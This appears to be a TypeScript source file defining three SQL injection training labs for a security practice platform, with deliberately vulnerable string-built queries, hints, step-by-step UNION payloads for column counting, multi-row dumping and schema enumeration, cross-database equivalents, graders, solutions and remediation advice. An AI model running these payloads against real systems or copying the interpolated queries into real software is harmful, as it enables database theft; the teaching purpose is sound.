import type { Lab } from '../types';
import { productsSeed, secretsSeed } from './seeds';
import { fail, findFlag, pass } from './helpers';

export const unionLabs: Lab[] = [
  {
    id: 'union-columns',
    title: 'Counting Columns, Then Stealing Rows',
    category: 'union',
    difficulty: 'Apprentice',
    dbms: 'SQLite',
    summary: 'The category filter echoes product rows. Append a second SELECT and print the secrets table into the page.',
    brief: [
      'A category filter runs `SELECT id, name, price FROM products WHERE category = ?` and prints every returned row into the HTML.',
      'UNION lets you bolt a completely different result set onto that query. The only requirements are that both SELECTs return the same number of columns and compatible types.',
      'There is a `secrets` table in the same database holding a live payment key.',
    ],
    objective: 'Retrieve the value from the `secrets` table and display it on the page.',
    appURL: 'https://shop.trailhead-outfitters.com/category?c=shoes',
    seed: [...productsSeed(), ...secretsSeed('FLAG{union_column_enumeration}')],
    fields: [{ id: 'category', label: 'category parameter', placeholder: 'shoes', value: 'shoes' }],
    query: (v) => `SELECT id, name, price FROM products WHERE category = '${v.category}'`,
    hints: [
      'Start by finding how many columns the original query has. `ORDER BY <n>` fails as soon as n exceeds the count.',
      'SQLite gives you the answer in the error message: "ORDER BY term out of range - should be between 1 and 3".',
      'Then close the string, add `UNION SELECT`, and put the secret where a text column lands.',
    ],
    walkthrough: [
      {
        title: 'Find the column count',
        text: [
          'Inject an ORDER BY with an increasing number. When the number exceeds the column count the query errors — that error is your answer.',
        ],
        payload: `shoes' ORDER BY 1--`,
        result: 'Works. Try 2, 3, 4 … — 4 fails with "ORDER BY term out of range - should be between 1 and 3".',
      },
      {
        title: 'Build a matching UNION',
        text: [
          'Three columns. Supply three values of compatible types — no need for them to come from a real table.',
        ],
        payload: `x' UNION SELECT 1,2,3--`,
        result: 'A row of 1,2,3 appears in the product table. Column 2 is echoed as text.',
      },
      {
        title: 'Redirect the second SELECT at the secret',
        text: ['Replace the literals with the columns you want to read.'],
        payload: `x' UNION SELECT 0, name, value FROM secrets--`,
        result: 'FLAG{union_column_enumeration} printed where the price would normally be.',
      },
      {
        title: 'Handle type mismatch',
        text: [
          'SQLite is dynamically typed, so text in a numeric column will not error. MySQL, PostgreSQL and MSSQL will. If you hit "Conversion failed" or "operator does not exist", move your string payload into a column that accepts text — usually the one echoed from a VARCHAR.',
        ],
      },
      {
        title: 'Fix',
        text: ['Parameterised queries, plus least-privilege database accounts: the web user should not be able to read the payments schema at all.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Exfiltrated the payment key: ${flag}`);
      return fail('Only product rows so far. Count the columns, then UNION your own SELECT.');
    },
    solution: { category: `x' UNION SELECT 0, name, value FROM secrets--` },
  },

  {
    id: 'union-multirow',
    title: 'Dumping Many Rows Through One Column',
    category: 'union',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'Only one text column is echoed, but the secrets table has six rows. Collapse them with group_concat.',
    brief: [
      'The article author filter returns three columns, and only the middle one is text — the other two get coerced and vanish from the rendered page.',
      'The `secrets` table holds a live Stripe key, an SMTP password and a JWT signing key. You have a single column to carry them all.',
      'This is where UNION-based extraction gets interesting: you are not limited to one row per request.',
    ],
    objective: 'Dump every row of `secrets` in a single response.',
    appURL: 'https://blog.acme.io/articles?author=jdoe',
    seed: [
      `CREATE TABLE articles (id INTEGER PRIMARY KEY, title TEXT, author TEXT);`,
      `INSERT INTO articles (title, author) VALUES
         ('Scaling our ingestion pipeline', 'jdoe'),
         ('Why we moved off stored procedures', 'jdoe'),
         ('Postmortem: the 2023 credential leak', 'mjones');`,
      ...secretsSeed('FLAG{union_multi_row_dump}', 'stripe_live_key', [
        ['smtp_password', 'em41l_r3lay_pw'],
        ['jwt_signing_key', 'hS1kk2Lm9Qz'],
        ['backup_bucket', 's3://acme-nightly-2024'],
        ['github_pat', 'ghp_9dK2mQxLp0'],
      ]),
    ],
    fields: [{ id: 'author', label: 'author parameter', placeholder: 'jdoe', value: 'jdoe' }],
    query: (v) => `SELECT id, title, author FROM articles WHERE author = '${v.author}'`,
    hints: [
      '`group_concat(column, separator)` packs a whole table into one string.',
      'Concatenate two columns together with `||` so you keep the key/value relationship.',
      'You still need to satisfy the three-column count: pad with literals.',
    ],
    walkthrough: [
      {
        title: 'Confirm three columns',
        text: ['Same ORDER BY trick as the previous lab.'],
        payload: `jdoe' ORDER BY 3--`,
        result: 'Three columns confirmed (4 would error).',
      },
      {
        title: 'Collapse the table into one cell',
        text: [
          '`group_concat` is SQLite\'s aggregate string join. Give it a name=value expression and a separator.',
        ],
        payload: `x' UNION SELECT 0, group_concat(name || '=' || value, ' | '), '' FROM secrets--`,
        result: 'stripe_live_key=FLAG{union_multi_row_dump} | smtp_password=… | jwt_signing_key=…',
      },
      {
        title: 'Other databases',
        text: [
          'MySQL: `GROUP_CONCAT(name, "=", value SEPARATOR " | ")`. PostgreSQL: `string_agg(name || \'=\' || value, \' | \')`. MSSQL: `STRING_AGG(..., \' | \')` (2017+) or `FOR XML PATH`. Oracle: `LISTAGG`.',
          'When aggregates are filtered, paginate instead with `LIMIT 1 OFFSET n` (or `FETCH FIRST` / `ROWNUM`) and one row per request.',
        ],
      },
      {
        title: 'Fix',
        text: ['Again: parameters. And do not co-locate payment credentials with a table the storefront can read. Secrets belong in a managed secret store, not in the application schema.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Whole secret table exfiltrated in one request: ${flag}`);
      return fail('You need more than one row. Collapse the table with an aggregate, or paginate.');
    },
    solution: { author: `x' UNION SELECT 0, group_concat(name || '=' || value, ' | '), '' FROM secrets--` },
    probe: undefined,
  },

  {
    id: 'union-schema',
    title: 'Schema Discovery with sqlite_master',
    category: 'union',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'You are not told which table holds the flag. Enumerate the schema first, then read it.',
    brief: [
      'A notes application returns only `id` and `title` — two columns, no obvious text sink for anything else.',
      'In real engagements you rarely know the table names. Every database engine exposes its own metadata catalogue; for SQLite it is the `sqlite_master` table.',
    ],
    objective: 'Find the hidden table and dump its contents.',
    appURL: 'https://notes.acme.io/note?id=1',
    seed: [
      `CREATE TABLE notes (id INTEGER PRIMARY KEY, title TEXT, body TEXT);`,
      `INSERT INTO notes (title, body) VALUES
         ('Q3 planning', 'Draft agenda — do not share.'),
         ('Vendor list', 'Renewals due in March.');`,
      `CREATE TABLE vault_x9 (id INTEGER PRIMARY KEY, kind TEXT, payload TEXT);`,
      `INSERT INTO vault_x9 (kind, payload) VALUES
         ('rotation', 'next rotation 2026-04-01'),
         ('token', 'FLAG{union_schema_enumeration}');`,
      `CREATE TABLE sessions_audit (id INTEGER PRIMARY KEY, username TEXT, ts TEXT);`,
    ],
    fields: [{ id: 'id', label: 'id parameter', placeholder: '1', value: '1' }],
    query: (v) => `SELECT id, title FROM notes WHERE id = ${v.id}`,
    hints: [
      'Only two columns come back, so your UNION needs exactly two.',
      '`SELECT name FROM sqlite_master WHERE type=\'table\'` lists every table in the database.',
      'Once you know the table name, list its columns from `pragma_table_info`.',
    ],
    walkthrough: [
      {
        title: 'Enumerate tables',
        text: ['Two columns available. Squash the table list into one cell.'],
        payload: `0 UNION SELECT 1, group_concat(name) FROM sqlite_master WHERE type='table'--`,
        result: 'notes, vault_x9, sessions_audit, sqlite_sequence',
      },
      {
        title: 'Enumerate columns of the interesting table',
        text: ['`pragma_table_info` is a table-valued function that returns one row per column.'],
        payload: `0 UNION SELECT 1, group_concat(name) FROM pragma_table_info('vault_x9')--`,
        result: 'id, kind, payload',
      },
      {
        title: 'Read it',
        text: ['Now point the second SELECT at the column that matters.'],
        payload: `0 UNION SELECT 1, group_concat(payload) FROM vault_x9--`,
        result: 'next rotation 2026-04-01, FLAG{union_schema_enumeration}',
      },
      {
        title: 'Other engines',
        text: [
          'MySQL/MariaDB: `information_schema.tables` and `.columns`. PostgreSQL: `information_schema` or `pg_catalog`. MSSQL: `sys.objects` / `sys.columns` or `INFORMATION_SCHEMA`. Oracle: `all_tables`, `all_tab_columns` (note the uppercase identifiers).',
        ],
      },
      {
        title: 'Fix',
        text: ['Disable detailed errors, run the app with a database user that only sees its own schema, and — as always — bind the parameter.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Schema walked, table dumped: ${flag}`);
      return fail('Two columns, two cells. Enumerate first, extract second.');
    },
    solution: { id: `0 UNION SELECT 1, group_concat(payload) FROM vault_x9--` },
  },
];
